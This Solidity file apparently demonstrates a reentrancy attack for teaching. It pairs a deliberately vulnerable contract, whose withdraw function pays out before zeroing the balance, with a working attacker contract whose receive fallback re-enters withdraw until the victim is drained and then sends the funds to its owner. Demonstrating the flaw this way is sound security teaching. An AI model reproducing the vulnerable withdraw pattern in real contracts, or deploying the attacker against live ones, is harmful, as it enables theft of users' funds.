// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract ReentrancyVulnerable {
    using Address for address payable;

    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balanceOf[msg.sender] > 0, "Nothing to Withdraw");

        uint256 depositedAmount = balanceOf[msg.sender];

        console.log("");
        console.log("ReentrancyVictim's balance: ", address(this).balance);
        console.log("ReentrancyAttacker's balance: ", balanceOf[msg.sender]);
        console.log("");

        payable(msg.sender).sendValue(depositedAmount);

        balanceOf[msg.sender] = 0;
    }
}

interface IReentrancyVulnerable {
    function deposit() external payable;

    function withdraw() external;
}

contract ReentrancyAttacker is Ownable {
    IReentrancyVulnerable public immutable reentrancyVulnerable;

    constructor(address reentrancyVulnerableContractAddress) {
        reentrancyVulnerable = IReentrancyVulnerable(
            reentrancyVulnerableContractAddress
        );
    }

    function attack() external payable onlyOwner {
        reentrancyVulnerable.deposit{value: msg.value}();
        reentrancyVulnerable.withdraw();
    }

    receive() external payable {
        if (address(reentrancyVulnerable).balance > 0) {
            console.log("");
            console.log("Reentring...");
            reentrancyVulnerable.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}
